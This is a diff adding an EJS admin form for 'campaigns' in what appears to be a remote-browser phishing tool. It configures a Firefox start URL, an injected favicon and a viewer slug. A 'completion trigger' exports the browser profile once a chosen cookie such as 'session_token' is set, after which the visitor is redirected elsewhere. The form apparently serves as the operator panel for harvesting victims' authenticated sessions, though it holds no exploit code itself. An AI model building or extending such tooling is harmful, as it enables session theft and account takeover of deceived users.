@@ -1,0 +1,89 @@
+<%- include('../../partials/head') %>
+<%- include('../../partials/nav') %>
+<div class="container" style="max-width:640px">
+  <h1><%= campaign ? 'Edit Campaign' : 'New Campaign' %></h1>
+  <% if (error) { %><div class="alert alert-danger"><%= error %></div><% } %>
+
+  <form method="POST" action="/admin/campaigns<%= campaign ? '/' + campaign.id : '' %>">
+    <div class="form-group">
+      <label>Name *</label>
+      <input type="text" name="name" class="form-control" required
+             value="<%= (campaign && campaign.name) || '' %>">
+    </div>
+    <div class="form-group">
+      <label>Description</label>
+      <textarea name="description" class="form-control" rows="2"><%= (campaign && campaign.description) || '' %></textarea>
+    </div>
+    <div class="form-row">
+      <div class="form-group">
+        <label>Expiry Date *</label>
+        <input type="date" name="expires_date" class="form-control" required
+               value="<%= (campaign && campaign.expires_at) ? campaign.expires_at.slice(0,10) : '' %>">
+        <label style="margin-top:.5rem">Expiry Time *</label>
+        <input type="time" name="expires_time" class="form-control" required
+               value="<%= (campaign && campaign.expires_at) ? (campaign.expires_at.slice(11,16) || '23:59') : '23:59' %>">
+      </div>
+      <div class="form-group">
+        <label>Container Lifetime (minutes)</label>
+        <input type="number" name="lifetime_minutes" class="form-control" min="5" max="480"
+               value="<%= (campaign && campaign.lifetime_minutes) || 60 %>">
+      </div>
+    </div>
+    <div class="form-group">
+      <label>Redirect URL * <small>(user lands here after session ends)</small></label>
+      <input type="url" name="redirect_url" class="form-control" required
+             value="<%= (campaign && campaign.redirect_url) || '' %>">
+    </div>
+    <div class="form-group">
+      <label>Firefox Start URL * <small>(page Firefox opens at session start)</small></label>
+      <input type="url" name="start_url" class="form-control" required
+             value="<%= (campaign && campaign.start_url) || '' %>">
+    </div>
+    <div class="form-group">
+      <label>Favicon URL <small>(injected into browser session)</small></label>
+      <input type="url" name="favicon_url" class="form-control"
+             value="<%= (campaign && campaign.favicon_url) || '' %>">
+    </div>
+    <div class="form-group">
+      <label>URL Slug <small>(viewer URL: <code>/<em>slug</em>/session-id</code>)</small></label>
+      <input type="text" name="slug" class="form-control" placeholder="e.g. my-campaign"
+             value="<%= (campaign && campaign.slug) || '' %>">
+    </div>
+
+    <fieldset style="border:1px solid var(--border,#333);border-radius:6px;padding:1rem;margin-bottom:1rem">
+      <legend style="padding:0 .5rem;font-size:.9rem;font-weight:600">Completion Trigger <small style="font-weight:400">(optional — either condition triggers profile export)</small></legend>
+      <div class="form-group" style="margin-bottom:.75rem">
+        <label>URL <small>— when Firefox navigates to a URL starting with this value</small></label>
+        <input type="url" name="completion_url" class="form-control"
+               value="<%= (campaign && campaign.completion_url) || '' %>">
+      </div>
+      <div class="form-group" style="margin-bottom:0">
+        <label>Cookie Name <small>— when a cookie with this name is set in the browser</small></label>
+        <input type="text" name="completion_cookie" class="form-control" placeholder="e.g. session_token"
+               value="<%= (campaign && campaign.completion_cookie) || '' %>">
+      </div>
+    </fieldset>
+
+    <div class="form-group">
+      <label style="display:flex;align-items:center;gap:.5rem;cursor:pointer">
+        <input type="checkbox" name="show_loading_page"
+               <%= (!campaign || campaign.show_loading_page) ? 'checked' : '' %>>
+        Show loading page <small>(animated waiting screen while the browser session starts)</small>
+      </label>
+    </div>
+    <div class="form-group">
+      <label>After completion</label>
+      <select name="after_completion" class="form-control">
+        <option value="redirect" <%= (!campaign || campaign.after_completion === 'redirect') ? 'selected' : '' %>>Redirect to redirect URL</option>
+        <option value="keep_alive" <%= (campaign && campaign.after_completion === 'keep_alive') ? 'selected' : '' %>>Keep session alive until expiry</option>
+      </select>
+      <small>Only applies when a completion trigger is configured above.</small>
+    </div>
+
+    <div class="form-actions">
+      <button type="submit" class="btn btn-primary">Save Campaign</button>
+      <a href="/admin/campaigns" class="btn">Cancel</a>
+    </div>
+  </form>
+</div>
+<%- include('../../partials/foot') %>
